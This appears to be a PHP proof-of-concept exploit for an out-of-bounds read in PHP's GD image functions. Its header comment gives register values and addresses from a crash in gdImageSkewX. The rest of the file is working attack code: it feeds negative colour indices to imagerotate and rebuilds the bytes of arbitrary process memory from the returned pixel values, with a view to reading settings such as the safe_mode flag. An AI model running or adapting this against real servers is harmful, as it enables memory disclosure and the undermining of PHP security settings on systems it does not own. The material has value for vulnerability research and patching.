<?php 
/* 
edi = src 
esi = clrBack ( -205923 for core_globals safe mode ( 0x IF APR SM MQS)
sample: 0x01 00 SM 00 ) 
 
( 
            zend_bool
magic_quotes_sybase;                               MQS 
            zend_bool safe_mode;                                     SM 
            zend_bool allow_call_time_pass_reference;               APR 
            zend_bool
implicit_flush;                                            IF 
) 
 
0x080ed27f <php_gd_gdImageSkewX+1135>:  mov    0x10(%edi,%esi,4),%ebx 
mov ebx, [edi+esi*4+10] 
 
test case: 
edi = 0x084c6128 
esi = 0xffee07b1(-1177679) values less than this will crash. 
=> 
ebx = 0x8047ff6 
 
if (a>127) { 
            a = 127; 
} 
:( since alpha blending is on by default, the 32th bit of dumped address cant be detected. 
*/ 
$debug = 0; 
$address = hexdec($argv[1]); 
$addressSave = $address; 
$count = $argv[3]+1; 
$mode = $argv[2]; 
$src = 0x84cde2c; 
$s = 10; //image size 
 
$GLOBALS["image"]=imagecreate($s,$s); 
$r = $GLOBALS["image"]; 
if( $debug ) 
            echo "Image created.\n"; 
 

function getDataFromImage( $index ) { 
            $tmp = imagerotate ($GLOBALS["image"],5,$index); 
            return imagecolorat( $tmp, 0,0); 
} 
 
$eor = 0; 
while( $address < $addressSave+$count*4 ) { 
            // indexes 
            $index_b = (int)(($src - $address + 0x810)/4); 
            $index_g = $index_b + 256; 
            $index_r = $index_b + 512; 
            $index_a = $index_b - 1034; 
            //$index_gG is the same as index of r 
            $index_gR = $index_g + 512; 
            //$index_rG is the same as index of gR 
            //$index_gGg is the same as index of gR 
 
            // fuctions 
            $f_b = getDataFromImage( -$index_b ); 
            $f_g = getDataFromImage( -$index_g ); 
            $f_r = getDataFromImage( -$index_r ); 
            $f_a = getDataFromImage( -$index_a ); 
            $f_gR = getDataFromImage( -$index_gR ); 
 /
            /********************* Byte 1 **********************/ 
 
            // b byte 1 
            $byte_b1 =  $f_b & 0x000000ff; 
            if( $debug ) 
                        printf( "b:1-0x%x\n", $byte_b1 ); 
 
            //g byte 1 
            $byte_g1 =  $f_g & 0x000000ff; 
            if( $debug ) 
                        printf( "g:1-0x%x\n", $byte_g1 ); 
 
            //r byte 1 
            $byte_r1 =  $f_r& 0x000000ff; 
            if( $debug ) 
                        printf( "r:1-0x%x\n", $byte_r1 ); 
 
            //a byte 1 
            $byte_a1 =  $f_a & 0x000000ff; 
            if( $debug ) 
                        printf( "a:1-0x%x\n\n", $byte_a1 ); 
 
            /* Relative */ 
 
            // gG byte 1 
            // this is relative g to `g`( suppose that 'g' is a b). so its right at the position of r. 
            $byte_gG1 =  $byte_r1; 
 
            // gR byte 1 
            // this is relative r to `g`( suppose that 'g' is a b) 
            $byte_gR1 =  $f_gR & 0x000000ff; 
 
            // rG byte 1 
            // this is relative g to r( suppose that 'r' is a b) 
            $byte_rG1 =  $byte_gR1; 
 
            /* 2 Level Relative */ 
 
            // gGg byte 1 
            // this is relative g to `gG`( suppose that 'gG' is a b) 
            $byte_gGg1 =  $byte_gR1; 
 
            /********************* Byte 2 **********************/ 
 
            // b byte 2 
            $sum_b2_g1 =  (($f_b & 0x0000ff00) >> 8 ); 
            $byte_b2 = $sum_b2_g1 - $byte_g1; 
            $borrow_b2 = 0; 
            if( $byte_b2 < 0 ) 
                        $borrow_b2 = 1; 
            $byte_b2 = $byte_b2 & 0x000000ff; 
            if( $debug ) 
                        printf( "b:2-0x%x  \t0x%x\n", $byte_b2, $f_b ); 
 
            // g byte 2 

            $sum_g2_gG1 =  (($f_g & 0x0000ff00) >> 8 ); 
            $byte_g2 = $sum_g2_gG1 - $byte_gG1; 
            $borrow_g2 = 0; 
            if( $byte_g2 < 0 ) 
                        $borrow_g2 = 1; 
            $byte_g2 = $byte_g2 & 0x000000ff; 
            if( $debug ) 
                        printf( "g:2-0x%x  \t0x%x\n", $byte_g2, $f_gG1 ); 
 
            // r byte 2 
            $sum_r2_rG1 =  (($f_r& 0x0000ff00) >> 8 ); 
            $byte_r2 = $sum_r2_rG1 - $byte_rG1; 
            $byte_r2 = $byte_r2 & 0x000000ff; 
            if( $debug ) 
                        printf( "r:2-0x%x  \t0x%x\n\n", $byte_r2 ,$sum_r2_rG1 ); 
 
            /* Relative */ 
 
            // gG byte 2 
            $byte_gG2 = $byte_r2; 
 
            /********************* Byte 3 **********************/ 
 
            // b byte 3 
            $sum_b3_g2_r1_br2 =  (($f_b & 0x00ff0000) >> 16 ); 
            $sum_b3_g2_r1 = $sum_b3_g2_r1_br2 - $borrow_b2; 
            $sum_b3_g2 =  $sum_b3_g2_r1 - $byte_r1; 
            $byte_b3 = $sum_b3_g2 - $byte_g2; 
            $borrow_b3 = 0; 
            if( $byte_b3 < 0 ) 
            { 
                        $borrow_b3 = (int)(-$byte_b3 / 0xff) + 1; //for borrows more than one 
                        if( $debug ) 
                                    printf( "\nborrow was: %d\n" $borrow_b3 ); 
            } 
            $byte_b3 = $byte_b3 & 0x000000ff; 
            if( $debug ) 
                        printf( "b:3-0x%x  \t0x%x\n", $byte_b3,$sum_b3_g2 ); 
 
            // g byte 3 
            $sum_g3_gG2_gR1_br2 =  (($f_g & 0x00ff0000) >> 16 ); 
            $sum_g3_gG2_gR1 = $sum_g3_gG2_gR1_br2 - $borrow_g2; 
            $sum_g3_gG2 = $sum_g3_gG2_gR1 - $byte_gR1; 
            $byte_g3 = $sum_g3_gG2 - $byte_gG2; 
            $byte_g3 = $byte_g3 & 0x000000ff; 
            if( $debug ) { 
                        printf( "f_g: 0x%x\n" , $f_g); 
                        printf( "sum_g3_gG2_gR1_br2: 0x%x\n" , $sum_g3_gG2_gR1_br2 ); 

                        printf( "sum_g3_gG2_gR1: 0x%x\n" ,$sum_g3_gG2_gR1 ); 
                        printf( "sum_g3_gG2: 0x%x\n" , $sum_g3_gG2 ); 
                        printf( "g:3-0x%x  \t0x%x\n\n", $byte_g3,$sum_b3_g2 ); 
            } 
 
            /********************* Byte 4 **********************/ 
 
            // b byte 4 
            $sum_b4_g3_r2_a1_br3 =  (($f_b & 0xff000000) >> 24 ); 
            $sum_b4_g3_r2_a1 = $sum_b4_g3_r2_a1_br3 - $borrow_b3; 
            $sum_b4_g3_r2 =  $sum_b4_g3_r2_a1 - $byte_a1; 
            $sum_b4_g3 = $sum_b4_g3_r2 - $byte_r2; 
            $byte_b4 = $sum_b4_g3 - $byte_g3; 
            $byte_b4 = $byte_b4 & 0x000000ff; 
            if( $debug ) { 
                        printf( "f_b: 0x%x\n" , $f_b); 
                        printf( "sum_b4_g3_r2_a1_br3: 0x%x\n" ,$sum_b4_g3_r2_a1_br3 ); 
                        printf( "sum_b4_g3_r2_a1: 0x%x\n" ,$sum_b4_g3_r2_a1 ); 
                        printf( "sum_b4_g3_r2: 0x%x\n" , $sum_b4_g3_r2 ); 
                        printf( "sum_b4_g3: 0x%x\n" , $sum_b4_g3 ); 
                        printf( "b:4-0x%x\n\n", $byte_b4); 
            } 
            /********************* Byte **********************/ 
 
            if($mode == 0) {  //text mode 
                        printf( "%c%c%c%c", $byte_b1, $byte_b2,$byte_b3, $byte_b4); 
            } elseif( $mode == 1) { 
                        // b 
                        if( !$eor ) 
                                    printf( "0x%x:\t", $address ); 
                        printf("0x%x(%c)\t0x%x(%c)\t0x%x(%c)\t0x%x(%c)\t", $byte_b1, $byte_b1, 
                                                                                                                       
   $byte_b2, $byte_b2, 
                                                                                                                       
   $byte_b3, $byte_b3, 
                                                                                                                       
   $byte_b4, $byte_b4 ); 
 
                        $eor = !$eor; 
                        if( !$eor ) 
                                    echo "\n"; 
            } else { 
                        $val = ($byte_b4 << 24) + ($byte_b3 << 16) +($byte_b2 << 8) + $byte_b1; 
                        printf( "0x%x: 0x%x\n", $address, $val ); 
            } 
            $address+=4; 
} 
?> 
